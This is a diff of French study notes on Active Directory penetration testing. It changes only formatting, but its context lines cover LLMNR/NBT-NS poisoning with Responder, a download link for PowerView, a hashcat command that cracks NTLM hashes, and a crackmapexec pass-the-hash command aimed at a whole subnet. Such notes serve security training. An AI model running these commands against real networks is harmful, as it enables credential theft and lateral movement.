@@ -14,7 +14,7 @@ INITIAL VECTOR
 - Auparavant NBT-NS
 - Problème : les services utilisent un username et un hash NTLMv2 quand ils nous répondent.
 
-1 .2 Comment faire ?
+1.2 Comment faire ?
 
 - Responder
 
@@ -124,7 +124,7 @@ POST-COMPROMISE ENUMERATION
 
 1. Powerview
 
-1 .1 Présentation
+1.1 Présentation
 
 Télécharger sur : https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
 
@@ -249,6 +249,7 @@ On récupère les hashes
 
 Casser les hashes:
 hashcat -m 1000 hash.txt rockyou.txt
+
 1.2.2 Pass the Hash 
 
 crackmapexec smb 192.168.1.0/24 -u "John Doe" -H <copier hash ici> --local-auth
